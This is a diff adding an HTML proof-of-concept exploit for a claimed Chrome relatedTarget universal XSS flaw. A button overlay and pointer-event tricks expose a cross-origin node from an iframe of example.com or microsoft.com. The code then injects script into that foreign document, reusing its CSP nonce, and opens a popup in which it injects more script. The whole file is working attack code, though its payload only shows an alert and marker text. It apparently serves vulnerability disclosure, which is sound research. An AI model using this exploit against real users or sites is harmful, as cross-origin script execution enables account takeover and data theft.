@@ -1,0 +1,205 @@
+<!doctype html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Chrome Stable relatedTarget UXSS — Example.com</title>
+<style>
+  * { box-sizing: border-box; }
+  body { margin: 0; background: #0b1422; color: #eef7ff; font: 14px system-ui,sans-serif; }
+  header { position: fixed; inset: 0 0 auto; z-index: 20; height: 150px; padding: 10px 14px; background: #172c4c; }
+  header strong { display: block; font-size: 18px; }
+  #summary { color: #9fe1ff; }
+  #log { height: 78px; margin: 6px 0 0; overflow: auto; white-space: pre-wrap; }
+  iframe { position: fixed; inset: 150px 0 0; width: 100%; height: calc(100% - 150px); border: 4px solid #4b83da; background: white; }
+  #trigger { position: fixed; z-index: 30; left: 50%; top: 56%; transform: translate(-50%,-50%); padding: 22px 26px; border: 0; border-radius: 12px; background: #d64b69; color: white; font: 18px system-ui,sans-serif; }
+</style>
+<header>
+  <strong>PoC_by_xzyhellsing — Chrome Stable relatedTarget UXSS</strong>
+  <div id="summary">Tap the red button once. No credentials or private data are accessed.</div>
+  <pre id="log"></pre>
+</header>
+<iframe id="victim"></iframe>
+<button id="trigger">One trusted tap</button>
+<script>
+(() => {
+  "use strict";
+
+  const marker = "PoC_by_xzyhellsing";
+  const params = new URLSearchParams(location.search);
+  const microsoftTarget = location.hostname.startsWith("microsoft-related-target-uxss") ||
+    location.pathname.endsWith("/microsoft.html") || params.get("target") === "microsoft";
+  const targetUrl = microsoftTarget
+    ? "https://www.microsoft.com/robots.txt?relatedtarget-uxss=microsoft"
+    : "https://example.com/?relatedtarget-uxss=example";
+  const expectedOrigin = microsoftTarget ? "https://www.microsoft.com" : "https://example.com";
+  const matchedControl = params.get("control") === "1" || location.hash === "#control";
+  const trigger = document.querySelector("#trigger");
+  const victim = document.querySelector("#victim");
+  const logNode = document.querySelector("#log");
+  const summary = document.querySelector("#summary");
+  const records = [];
+  const seen = new WeakSet();
+  let attacked = false;
+  let popupCounter = 0;
+
+  window.__relatedTargetRecords = records;
+  document.title = `Chrome Stable relatedTarget UXSS — ${microsoftTarget ? "Microsoft" : "Example.com"}`;
+  document.querySelector("header strong").textContent =
+    `PoC_by_xzyhellsing — Chrome Stable relatedTarget UXSS — ${microsoftTarget ? "Microsoft" : "Example.com"}`;
+
+  function log(kind, detail = {}) {
+    records.push({time: performance.now(), kind, detail});
+    logNode.textContent += `${kind} ${JSON.stringify(detail)}\n`;
+    logNode.scrollTop = logNode.scrollHeight;
+    summary.textContent = `${matchedControl ? "CONTROL" : "POSITIVE"} records=${records.length} attacked=${attacked}`;
+  }
+
+  function buildForeignBootstrap(popupName, foreignUrl, foreignOrigin) {
+    const proofSource = `(() => {
+      const originProof = location.origin;
+      const hrefProof = location.href;
+      document.documentElement.innerHTML = '<body style="font:24px system-ui;padding:32px"><h1 id="PoC_by_xzyhellsing">PoC_by_xzyhellsing</h1><p id="foreign-origin"></p><pre id="foreign-href"></pre></body>';
+      document.getElementById('foreign-origin').textContent = originProof;
+      document.getElementById('foreign-href').textContent = hrefProof;
+      document.documentElement.dataset.relatedTargetUxss = 'confirmed';
+      document.title = 'PoC_by_xzyhellsing relatedTarget ' + originProof;
+      alert(originProof);
+    })()`;
+
+    return `(() => {
+      const popupName = ${JSON.stringify(popupName)};
+      const foreignUrl = ${JSON.stringify(foreignUrl)};
+      const foreignOrigin = ${JSON.stringify(foreignOrigin)};
+      const proofSource = ${JSON.stringify(proofSource)};
+      let launched = false;
+
+      document.documentElement.dataset.relatedTargetArmed = ${JSON.stringify(marker)};
+      const childMarker = document.createElement('div');
+      childMarker.id = 'PoC_by_xzyhellsing_child';
+      childMarker.textContent = 'PoC_by_xzyhellsing foreign child armed: ' + location.origin;
+      childMarker.style.cssText = 'position:fixed;inset:0 auto auto 0;z-index:2147483647;background:#7b1020;color:white;padding:10px;font:16px system-ui';
+      document.documentElement.append(childMarker);
+
+      function launchTopLevelProof() {
+        if (launched) return;
+        launched = true;
+        const popup = window.open(foreignUrl, popupName);
+        if (!popup) return;
+        let attempts = 0;
+        const timer = setInterval(() => {
+          attempts++;
+          try {
+            if (popup.location.protocol === 'https:' && popup.location.origin === foreignOrigin) {
+              const popupDocument = popup.document;
+              const proofScript = popupDocument.createElement('script');
+              const nonceSource = popupDocument.querySelector('script[nonce]');
+              if (nonceSource && nonceSource.nonce) proofScript.nonce = nonceSource.nonce;
+              proofScript.textContent = proofSource;
+              (popupDocument.head || popupDocument.documentElement).appendChild(proofScript);
+              clearInterval(timer);
+              return;
+            }
+          } catch (_) {}
+          if (attempts > 120) clearInterval(timer);
+        }, 100);
+      }
+
+      for (const type of ['pointerup', 'touchend', 'click']) {
+        addEventListener(type, launchTopLevelProof, {capture: true, once: true});
+      }
+      if (navigator.userActivation && navigator.userActivation.isActive) {
+        queueMicrotask(launchTopLevelProof);
+      }
+    })()`;
+  }
+
+  function inspectCandidate(value, source) {
+    if (attacked || !value || (typeof value !== "object" && typeof value !== "function") || seen.has(value)) return;
+    seen.add(value);
+
+    let owner;
+    let ownerUrl;
+    let ownerOrigin;
+    try {
+      if (typeof value.nodeType !== "number") return;
+      owner = value.nodeType === Node.DOCUMENT_NODE ? value : value.ownerDocument;
+      ownerUrl = owner && owner.URL;
+      ownerOrigin = ownerUrl ? new URL(ownerUrl).origin : null;
+    } catch (error) {
+      log("FOREIGN_WRAPPER_CHECK_ERROR", {source, name: error.name, message: error.message});
+      return;
+    }
+
+    if (!owner || owner === document || ownerOrigin !== expectedOrigin) return;
+    log("FOREIGN_NODE_EXPOSED", {source, nodeName: value.nodeName, ownerUrl, ownerOrigin});
+
+    if (matchedControl) {
+      attacked = true;
+      log("MATCHED_CONTROL_DROPPED_NODE", {source, ownerOrigin});
+      return;
+    }
+
+    attacked = true;
+    const popupName = `related_target_example_${Date.now()}_${++popupCounter}`;
+    try {
+      const bootstrap = owner.createElement("script");
+      const nonceSource = owner.querySelector("script[nonce]");
+      if (nonceSource && nonceSource.nonce) bootstrap.nonce = nonceSource.nonce;
+      bootstrap.textContent = buildForeignBootstrap(popupName, ownerUrl, ownerOrigin);
+      (owner.head || owner.documentElement).appendChild(bootstrap);
+      log("FOREIGN_BOOTSTRAP_APPENDED", {ownerUrl, reusedNonce: Boolean(bootstrap.nonce)});
+    } catch (error) {
+      log("FOREIGN_MUTATION_BLOCKED", {source, name: error.name, message: error.message});
+    }
+  }
+
+  function inspectEvent(event) {
+    const source = `event:${event.type}`;
+    for (const [name, getter] of [
+      ["relatedTarget", () => event.relatedTarget],
+      ["fromElement", () => event.fromElement],
+      ["toElement", () => event.toElement],
+      ["pseudoTarget", () => event.pseudoTarget],
+    ]) {
+      try { inspectCandidate(getter(), `${source}.${name}`); }
+      catch (error) { log("GETTER_ERROR", {source: `${source}.${name}`, name: error.name, message: error.message}); }
+    }
+    log("BOUNDARY", {
+      type: event.type,
+      target: event.target && event.target.nodeName,
+      related: (() => { try { return event.relatedTarget && event.relatedTarget.nodeName; } catch (_) { return "blocked"; } })(),
+    });
+  }
+
+  for (const type of [
+    "pointerover", "pointerenter", "pointerdown", "gotpointercapture",
+    "lostpointercapture", "pointerup", "pointerout", "pointerleave",
+    "mouseover", "mouseenter", "mousedown", "mouseup", "mouseout",
+    "mouseleave", "click", "touchstart", "touchend", "focusin", "focusout",
+  ]) {
+    document.addEventListener(type, inspectEvent, true);
+    window.addEventListener(type, inspectEvent, true);
+  }
+
+  trigger.addEventListener("pointerdown", event => {
+    log("ARM", {pointerId: event.pointerId});
+    try { trigger.focus({preventScroll: true}); } catch (_) {}
+    try { trigger.setPointerCapture(event.pointerId); } catch (error) {
+      log("CAPTURE_ERROR", {phase: "set", name: error.name, message: error.message});
+    }
+    queueMicrotask(() => {
+      trigger.style.pointerEvents = "none";
+      trigger.style.visibility = "hidden";
+      try { victim.contentWindow.focus(); } catch (_) {}
+      try { trigger.releasePointerCapture(event.pointerId); } catch (error) {
+        log("CAPTURE_ERROR", {phase: "release", name: error.name, message: error.message});
+      }
+      trigger.remove();
+      log("OVERLAY_REMOVED", {parentHit: document.elementFromPoint(event.clientX, event.clientY)?.nodeName || null});
+    });
+  }, {once: true});
+
+  victim.addEventListener("load", () => log("VICTIM_LOADED", {src: victim.src}));
+  victim.src = targetUrl;
+  log("READY", {targetUrl, expectedOrigin, matchedControl, primitive: "PointerEvent.relatedTarget"});
+})();
+</script>
